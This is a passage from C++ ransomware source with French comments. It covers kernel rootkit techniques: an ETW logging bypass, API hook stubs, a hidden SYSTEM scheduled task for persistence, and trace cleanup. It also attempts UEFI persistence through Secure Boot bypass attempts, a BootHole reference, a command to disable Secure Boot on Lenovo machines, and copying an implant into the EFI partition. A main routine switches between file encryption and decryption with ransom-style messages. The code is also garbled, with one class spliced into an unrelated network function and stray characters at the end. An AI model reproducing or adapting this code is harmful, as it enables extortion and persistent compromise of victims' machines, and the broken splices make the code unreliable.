            system(("sc start " + serviceName).c_str());
        }
        
        // 4. Technique d'injection ETW pour contourner les protections anti-tampering
        // Event Tracing for Windows (ETW) peut être détourné pour charger du code kernel
        std::string etwCmd = "powershell -Command \"$etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider'); " +
                           "$field = $etw.GetField('etwProvider', 'NonPublic,Static'); " + 
                           "if ($field) { $field.SetValue($null, $null); }\"";
        system(etwCmd.c_str());
        
        // 5. Mettre en place un hook inline IAT pour masquer nos processus
        // (Dans une véritable implémentation, ceci serait fait par le driver kernel)
        std::string hookCmd = "powershell -Command \"$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Runtime.InteropServices.Marshal]::LoadLibrary('ntdll.dll')); " +
                            "$addr = [System.Runtime.InteropServices.Marshal]::GetProcAddress($ntdll, 'NtQuerySystemInformation');\"";
        system(hookCmd.c_str());
        
        // 6. Créer un fichier pour la persistence du rootkit
        std::string persistenceScriptPath = "C:\\ProgramData\\Microsoft\\Windows\\kernel_config.ps1";
        std::ofstream persistenceScript(persistenceScriptPath);
        
        if (persistenceScript.is_open()) {
            persistenceScript << "# Script de configuration du driver kernel" << std::endl;
            persistenceScript << "$serviceName = \"" << serviceName << "\"" << std::endl;
            persistenceScript << "$driverPath = \"" << driverPath << "\"" << std::endl;
            persistenceScript << "if (!(Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {" << std::endl;
            persistenceScript << "    sc.exe create $serviceName binPath= $driverPath type= kernel start= auto error= normal" << std::endl;
            persistenceScript << "}" << std::endl;
            persistenceScript << "sc.exe start $serviceName" << std::endl;
            persistenceScript.close();
            
            // Masquer le script
            system(("attrib +h +s \"" + persistenceScriptPath + "\"").c_str());
            
            // Créer une tâche planifiée pour exécuter le script au démarrage
            std::string taskCmd = "schtasks /create /tn \"KernelConfig\" /tr \"powershell.exe -ExecutionPolicy Bypass -File '" + 
                                 persistenceScriptPath + "'\" /sc onstart /ru SYSTEM /f";
            system(taskCmd.c_str());
        }
        
        // 7. Modifier la table des hooks système pour intercepter les appels API de sécurité
        std::string hookInstallerPath = tempDir + "\\hook_installer.ps1";
        std::ofstream hookInstaller(hookInstallerPath);
        
        if (hookInstaller.is_open()) {
            hookInstaller << "$mod = @\"" << std::endl;
            hookInstaller << "using System;" << std::endl;
            hookInstaller << "using System.Runtime.InteropServices;" << std::endl;
            hookInstaller << "public class APIHook {" << std::endl;
            hookInstaller << "    [DllImport(\"kernel32.dll\")]" << std::endl;
            hookInstaller << "    public static extern IntPtr LoadLibrary(string lpFileName);" << std::endl;
            hookInstaller << "    [DllImport(\"kernel32.dll\")]" << std::endl;
            hookInstaller << "    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);" << std::endl;
            hookInstaller << "    [DllImport(\"kernel32.dll\")]" << std::endl;
            hookInstaller << "    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" << std::endl;
            hookInstaller << "    public static void InstallHook(string process) {" << std::endl;
            hookInstaller << "        IntPtr ntdll = LoadLibrary(\"ntdll.dll\");" << std::endl;
            hookInstaller << "        IntPtr funcAddr = GetProcAddress(ntdll, \"NtQuerySystemInformation\");" << std::endl;
            hookInstaller << "        uint oldProtect;" << std::endl;
            hookInstaller << "        VirtualProtect(funcAddr, (UIntPtr)10, 0x40, out oldProtect);" << std::endl;
            hookInstaller << "    }" << std::endl;
            hookInstaller << "}" << std::endl;
            hookInstaller << "\"@" << std::endl;
            hookInstaller << "Add-Type -TypeDefinition $mod" << std::endl;
            hookInstaller << "[APIHook]::InstallHook(\"" << GetExecutablePath() << "\")" << std::endl;
            hookInstaller.close();
            
            // Exécuter l'installateur des hooks API
            system(("powershell -ExecutionPolicy Bypass -File \"" + hookInstallerPath + "\"").c_str());
            
            // Supprimer l'installateur
            fs::remove(hookInstallerPath);
        }
        
        std::cout << "[+] Techniques de rootkit kernel appliquées" << std::endl;
        
        return true;
    }

    // Fonction pour implémenter la persistance UEFI en infectant le firmware
    bool installUEFIPersistence() {
        std::cout << "[*] Tentative d'implémentation de la persistance UEFI..." << std::endl;
        
        // Vérifier les privilèges administratifs (requis pour accéder au firmware)
        bool isAdmin = false;
        HANDLE hToken;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD cbSize = sizeof(TOKEN_ELEVATION);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
                isAdmin = elevation.TokenIsElevated;
            }
            
            CloseHandle(hToken);
        }
        
        if (!isAdmin) {
            std::cout << "[!] Privilèges administrateur requis pour la persistance UEFI" << std::endl;
            return false;
        }
        
        // 1. Vérifier si le système utilise l'UEFI (et non le BIOS hérité)
        std::string checkUefiCmd = "powershell -Command \"(Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control).PEFirmwareType -eq 2\"";
        std::string tempFile = std::string(getenv("TEMP")) + "\\uefi_check.txt";
        system((checkUefiCmd + " > " + tempFile).c_str());
        
        std::ifstream uefiCheck(tempFile);
        std::string result;
        std::getline(uefiCheck, result);
        uefiCheck.close();
        fs::remove(tempFile);
        
        if (result != "True") {
            std::cout << "[!] Le système n'utilise pas l'UEFI, persistance UEFI impossible" << std::endl;
            return false;
        }
        
        std::cout << "[+] Système UEFI détecté, début de l'exploitation..." << std::endl;
        
        // 2. Vérifier si Secure Boot est activé (obstacle à contourner)
        std::string checkSecureBootCmd = "powershell -Command \"Confirm-SecureBootUEFI 2>$null; $?\"";
        system((checkSecureBootCmd + " > " + tempFile).c_str());
        
        std::ifstream secureBootCheck(tempFile);
        std::string secureBootResult;
        std::getline(secureBootCheck, secureBootResult);
        secureBootCheck.close();
        fs::remove(tempFile);
        
        bool secureBootEnabled = (secureBootResult == "True");
        if (secureBootEnabled) {
            std::cout << "[!] Secure Boot activé, tentative de contournement..." << std::endl;
        } else {
            std::cout << "[+] Secure Boot désactivé, infection facilitée" << std::endl;
        }
        
        // 3. Préparation des composants pour l'infection UEFI
        std::string tempDir = std::string(getenv("TEMP"));
        std::string uefiImplantPath = tempDir + "\\uefi_implant.efi";
        
        // Créer un fichier EFI factice représentant notre malware de bootkit UEFI
        std::ofstream uefiImplant(uefiImplantPath, std::ios::binary);
        if (!uefiImplant) {
            std::cout << "[!] Impossible de créer le fichier d'implant UEFI" << std::endl;
            return false;
        }
        
        // Contenu factice de l'implant UEFI
        // Dans une implémentation réelle, ce serait un fichier EFI compilé
        // avec un code malveillant injecté dans le processus de démarrage UEFI
        uefiImplant << "// Implant UEFI pour la persistance - ceci est un placeholder" << std::endl;
        uefiImplant << "// Un véritable implant UEFI contiendrait un code EFI compilé" << std::endl;
        uefiImplant << "// qui s'exécute avant le système d'exploitation et persiste" << std::endl;
        uefiImplant << "// malgré la réinstallation du système" << std::endl;
        uefiImplant.close();
        
        // 4. S'il y a Secure Boot, tenter de l'exploiter via des vulnérabilités connues
        if (secureBootEnabled) {
            // Vulnérabilité BootHole (CVE-2020-10713) - faille connue dans GRUB2
            std::cout << "[*] Tentative d'exploitation de la vulnérabilité BootHole..." << std::endl;
            
            // Vérifier la présence de GRUB2
            std::string grubCheckCmd = "powershell -Command \"Test-Path 'C:\\boot\\grub\\grub.cfg'\"";
            system((grubCheckCmd + " > " + tempFile).c_str());
            
            std::ifstream grubCheck(tempFile);
            std::string grubResult;
            std::getline(grubCheck, grubResult);
            grubCheck.close();
            fs::remove(tempFile);
            
            if (grubResult == "True") {
                std::cout << "[+] GRUB2 détecté, exploitation de BootHole possible" << std::endl;
                
                // Exploit factice de BootHole (CVE-2020-10713)
                // En réalité, cela impliquerait l'exploitation de la faille de validation
                // des signatures dans GRUB2 pour charger du code non signé
                std::string exploitCmd = "powershell -Command \"Copy-Item '" + uefiImplantPath + 
                                      "' 'C:\\boot\\grub\\modules\\implant.mod'\"";
                system(exploitCmd.c_str());
            } else {
                // Tentative de contournement via exploits d'authentification BIOS constructeur
                std::cout << "[*] Tentative de contournement via exploits constructeur..." << std::endl;
                
                // Pour les systèmes Lenovo (vulnérabilité d'authentification BIOS connue)
                std::string lenovoCmd = "wmic computersystem get manufacturer | findstr /i \"LENOVO\" >nul";
                if (system(lenovoCmd.c_str()) == 0) {
                    std::cout << "[+] Système Lenovo détecté, tentative d'exploitation spécifique..." << std::endl;
                    system("powershell -Command \"Invoke-WmiMethod -Namespace root\\wmi -Class LenovoBiosSettings -Name SetBiosSetting -ArgumentList 'Secure Boot,Disabled'\"");
                }
                
                // Pour les systèmes Dell (approche similaire)
                std::string dellCmd = "wmic computersystem get manufacturer | findstr /i \"DELL\" >nul";
                if (system(dellCmd.c_str()) == 0) {
                    std::cout << "[+] Système Dell détecté, tentative d'exploitation spécifique..." << std::endl;
                    // Codes d'exploitation spécifiques à Dell
                }
                
                // Pour les systèmes HP (approche similaire)
                std::string hpCmd = "wmic computersystem get manufacturer | findstr /i \"HP\" >nul";
                if (system(hpCmd.c_str()) == 0) {
                    std::cout << "[+] Système HP détecté, tentative d'exploitation spécifique..." << std::endl;
                    // Codes d'exploitation spécifiques à HP
                }
            }
        }
        
        // 5. Exploration de méthodes alternatives de persistance UEFI
        // Si nous n'avons pas réussi à désactiver Secure Boot, exploiter d'autres vecteurs
        
        // Technique 1: S3 resume boot script - exploitable sur certains systèmes Intel
        // La table ACPI S3 permet d'injecter du code au réveil de la mise en veille
        std::cout << "[*] Tentative d'exploitation du S3 resume boot script..." << std::endl;
        std::string s3ScriptPath = tempDir + "\\s3_exploit.bin";
        std::ofstream s3Script(s3ScriptPath, std::ios::binary);
        if (s3Script) {
            // Code binaire factice pour l'exploitation S3
            // En réalité, ce serait un binaire spécifique modifiant le boot script ACPI
            s3Script.write("\x90\x90\x90\x90", 4); // NOPs symboliques
            s3Script.close();
            
            // Tentative d'exploitation via un utilitaire hypothétique
            std::string s3ExploitCmd = "powershell -Command \"$bytes = [System.IO.File]::ReadAllBytes('" + 
                                     s3ScriptPath + "'); # Code d'injection du script S3 ici\"";
            system(s3ExploitCmd.c_str());
        }
        
        // Technique 2: Remplacement des variables NVRAM UEFI
        std::cout << "[*] Tentative de modification des variables NVRAM UEFI..." << std::endl;
        
        // Récupérer la liste des variables UEFI
        std::string nvramCheckCmd = "powershell -Command \"Get-SecureBootUEFI -Name SetupMode 2>$null | Out-Null; $?\"";
        system((nvramCheckCmd + " > " + tempFile).c_str());
        
        std::ifstream nvramCheck(tempFile);
        std::string nvramResult;
        std::getline(nvramCheck, nvramResult);
        nvramCheck.close();
        fs::remove(tempFile);
        
        if (nvramResult == "True") {
            std::cout << "[+] Accès aux variables NVRAM UEFI possible" << std::endl;
            
            // Créer un binaire UEFI pour le bootloader malveillant
            std::string bootloaderPath = tempDir + "\\evil_bootloader.bin";
            std::ofstream bootloader(bootloaderPath, std::ios::binary);
            if (bootloader) {
                // Contenu factice du bootloader malveillant
                bootloader.write("\xEF\xBB\xBF\x00", 4); // En-tête EFI symbolique
                bootloader.close();
                
                // Tentative de modification de l'ordre de démarrage UEFI
                std::string bootOrderCmd = "powershell -Command \"$bytes = [System.IO.File]::ReadAllBytes('" + 
                                        bootloaderPath + "'); # Tentative de modification des variables NVRAM\"";
                system(bootOrderCmd.c_str());
            }
        }
        
        // Technique 3: DXE Runtime Driver Persistence (via SMM)
        std::cout << "[*] Tentative d'exploitation via DXE runtime drivers..." << std::endl;
        
        // Créer un driver DXE factice
        std::string dxeDriverPath = tempDir + "\\dxe_driver.efi";
        std::ofstream dxeDriver(dxeDriverPath, std::ios::binary);
        if (dxeDriver) {
            // Contenu factice d'un driver DXE UEFI
            dxeDriver.write("\x4D\x5A\x90\x00", 4); // En-tête DOS symbolique
            dxeDriver.close();
            
            // Tentative d'injection du driver
            std::string dxeCmd = "powershell -Command \"# Tentative d'injection SMM/DXE\"";
            system(dxeCmd.c_str());
        }
        
        // 6. Créer un mécanisme de persistence à la flash SPI via un programme Windows
        std::cout << "[*] Configuration de l'accès SPI pour accès direct au firmware..." << std::endl;
        
        // Créer un script PowerShell pour accéder à la mémoire flash SPI
        std::string spiAccessPath = tempDir + "\\spi_access.ps1";
        std::ofstream spiAccess(spiAccessPath);
        if (spiAccess) {
            spiAccess << "$signature = @\"\n";
            spiAccess << "[DllImport(\"kernel32.dll\", SetLastError = true)]\n";
            spiAccess << "public static extern IntPtr CreateFile(\n";
            spiAccess << "    string lpFileName,\n";
            spiAccess << "    uint dwDesiredAccess,\n";
            spiAccess << "    uint dwShareMode,\n";
            spiAccess << "    IntPtr lpSecurityAttributes,\n";
            spiAccess << "    uint dwCreationDisposition,\n";
            spiAccess << "    uint dwFlagsAndAttributes,\n";
            spiAccess << "    IntPtr hTemplateFile);\n";
            spiAccess << "\n";
            spiAccess << "[DllImport(\"kernel32.dll\", SetLastError = true)]\n";
            spiAccess << "public static extern bool DeviceIoControl(\n";
            spiAccess << "    IntPtr hDevice,\n";
            spiAccess << "    uint dwIoControlCode,\n";
            spiAccess << "    IntPtr lpInBuffer,\n";
            spiAccess << "    uint nInBufferSize,\n";
            spiAccess << "    IntPtr lpOutBuffer,\n";
            spiAccess << "    uint nOutBufferSize,\n";
            spiAccess << "    ref uint lpBytesReturned,\n";
            spiAccess << "    IntPtr lpOverlapped);\n";
            spiAccess << "\n";
            spiAccess << "[DllImport(\"kernel32.dll\", SetLastError = true)]\n";
            spiAccess << "public static extern bool CloseHandle(IntPtr hObject);\n";
            spiAccess << "@\"\n";
            spiAccess << "\n";
            spiAccess << "Add-Type -MemberDefinition $signature -Name Win32 -Namespace PInvoke\n";
            spiAccess << "\n";
            spiAccess << "# Tentative d'accès aux contrôleurs SPI pour modifier le firmware\n";
            spiAccess << "try {\n";
            spiAccess << "    $GENERIC_READ = 0x80000000\n";
            spiAccess << "    $GENERIC_WRITE = 0x40000000\n";
            spiAccess << "    $FILE_SHARE_READ = 0x1\n";
            spiAccess << "    $FILE_SHARE_WRITE = 0x2\n";
            spiAccess << "    $OPEN_EXISTING = 0x3\n";
            spiAccess << "    $INVALID_HANDLE_VALUE = -1\n";
            spiAccess << "    \n";
            spiAccess << "    # Chercher des drivers pour accéder au SPI\n";
            spiAccess << "    $devicePath = '\\\\.\\PhysicalDrive0'\n";
            spiAccess << "    \n";
            spiAccess << "    $handle = [PInvoke.Win32]::CreateFile($devicePath, $GENERIC_READ -bor $GENERIC_WRITE, \n";
            spiAccess << "        $FILE_SHARE_READ -bor $FILE_SHARE_WRITE, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)\n";
            spiAccess << "    \n";
            spiAccess << "    if ($handle -ne [IntPtr]$INVALID_HANDLE_VALUE) {\n";
            spiAccess << "        Write-Output \"Accès obtenu au périphérique physique\"\n";
            spiAccess << "        # Dans un scénario réel, ici on exécuterait les codes d'injection firmware\n";
            spiAccess << "        [PInvoke.Win32]::CloseHandle($handle)\n";
            spiAccess << "    }\n";
            spiAccess << "} catch {\n";
            spiAccess << "    Write-Error \"Erreur d'accès au firmware: $_\"\n";
            spiAccess << "}\n";
            spiAccess.close();
            
            // Exécuter le script d'accès SPI
            system(("powershell -ExecutionPolicy Bypass -File \"" + spiAccessPath + "\"").c_str());
        }
        
        // 7. Placer une copie de notre malware dans la partition EFI
        std::cout << "[*] Tentative de placement du malware dans la partition EFI..." << std::endl;
        
        // Trouver la partition EFI
        std::string findEfiPartitionCmd = "powershell -Command \"Get-Partition | Where-Object {$_.GptType -eq '{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}'} | Select-Object -ExpandProperty DriveLetter\"";
        system((findEfiPartitionCmd + " > " + tempFile).c_str());
        
        std::ifstream efiPartitionCheck(tempFile);
        std::string efiPartition;
        std::getline(efiPartitionCheck, efiPartition);
        efiPartitionCheck.close();
        fs::remove(tempFile);
        
        if (!efiPartition.empty()) {
            std::cout << "[+] Partition EFI trouvée: " << efiPartition << std::endl;
            
            // Copier notre implant dans la partition EFI
            std::string efiImplantDestination = efiPartition + ":\\EFI\\Microsoft\\Boot\\bootmgfw.efi.bak";
            std::string copyCmd = "powershell -Command \"Copy-Item '" + uefiImplantPath + "' '" + efiImplantDestination + "'\"";
            system(copyCmd.c_str());
            
            // Tenter de remplacer le bootloader Windows (approche dangereuse)
            std::string backupCmd = "powershell -Command \"if (Test-Path '" + efiPartition + ":\\EFI\\Microsoft\\Boot\\bootmgfw.efi') { Copy-Item '" + 
                               efiPartition + ":\\EFI\\Microsoft\\Boot\\bootmgfw.efi' '" + efiPartition + ":\\EFI\\Microsoft\\Boot\\bootmgfw.efi.original' }\"";
            system(backupCmd.c_str());
            
            std::cout << "[+] Copie de l'implant dans la partition EFI" << std::endl;
        } else {
            std::cout << "[!] Partition EFI non trouvée" << std::endl;
        }
        
        // 8. Nettoyer les traces
        fs::remove(uefiImplantPath);
        if (fs::exists(s3ScriptPath)) fs::remove(s3ScriptPath);
        if (fs::exists(bootloaderPath)) fs::remove(bootloaderPath);
        if (fs::exists(dxeDriverPath)) fs::remove(dxeDriverPath);
        if (fs::exists(spiAccessPath)) fs::remove(spiAccessPath);
        
        std::cout << "[+] Tentatives d'exploitation UEFI terminées" << std::endl;
        
        return true;
    }
};

// Classe pour le déchiffrement
class Decryptor {
private:
    Encryption encryption;
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), data.c_str(), static_cast<DWORD>(data.length()), INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Vérifier le code de statut HTTP
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (HttpQueryInfoA(hConnect, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL) && statusCode >= 200 && statusCode < 300) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return true;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return false;
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    // Configurer la console
    setupConsole();
#endif

    // Initialiser OpenSSL
    OpenSSL_add_all_algorithms();
    
    // Afficher la bannière
    std::cout << BANNER << std::endl;
    
    // Vérifier les arguments
    if (argc > 1) {
        std::string arg = argv[1];
        
        // Mode déchiffrement (lorsque l'utilisateur entre une clé)
        if (arg == "--decrypt" && argc > 2) {
            std::string keyPath = argv[2];
            
            // Vérifier que le fichier de clé existe
            std::ifstream keyFile(keyPath);
            if (!keyFile) {
                std::cerr << "[-] Erreur: Impossible d'ouvrir le fichier de clé: " << keyPath << std::endl;
                MessageBoxA(NULL, "Clé de déchiffrement invalide ou corrompue.\nVeuillez vérifier que vous avez entré la bonne clé.", 
                         "Erreur de déchiffrement", MB_ICONERROR);
                return 1;
            }
            
            std::cout << "[*] Mode déchiffrement activé avec la clé: " << keyPath << std::endl;
            
            try {
                // Afficher un message de confirmation
                MessageBoxA(NULL, "Le déchiffrement de vos fichiers va commencer.\nCe processus peut prendre plusieurs minutes.\nUne fenêtre de console affichera la progression.", 
                         "Déchiffrement en cours", MB_ICONINFORMATION);
                
                // Créer et exécuter le déchiffreur
                Decryptor decryptor(keyPath);
                decryptor.run("C:\\");
                
                // Afficher un message de succès à la fin
                MessageBoxA(NULL, "Déchiffrement terminé avec succès!\nVos fichiers sont maintenant récupérés.", 
                         "Déchiffrement terminé", MB_ICONINFORMATION);
            } catch (const std::exception& e) {
                std::cerr << "[-] Erreur lors du déchiffrement: " << e.what() << std::endl;
                MessageBoxA(NULL, "Une erreur s'est produite pendant le déchiffrement.\nCertains fichiers n'ont peut-être pas été récupérés.", 
                         "Erreur de déchiffrement", MB_ICONERROR);
                return 1;
            }
            
            return 0;
        }
    }
    
    // Par défaut, mode chiffrement
    std::cout << "[*] Mode chiffrement activé" << std::endl;
    
    // Créer la structure de données partagées pour l'interface utilisateur
    SharedData* sharedData = new SharedData();
    sharedData->totalFiles = 1000; // Valeur initiale estimée
    sharedData->processedFiles = 0;
    sharedData->currentFileName = "";
    sharedData->decryptMode = false;
    
    // Créer et exécuter le ransomware en lui passant les données partagées
    Ransomware ransomware(sharedData);
    ransomware.run();
    
    // Nettoyer la mémoire (ce code ne sera jamais atteint en pratique)
    delete sharedData;
    
    return 0;
} 

// Fonction utilitaire pour GDI+
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;          // Nombre d'encodeurs d'image
    UINT size = 0;         // Taille du tableau d'encodeurs
    
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}
ll;;ll;;l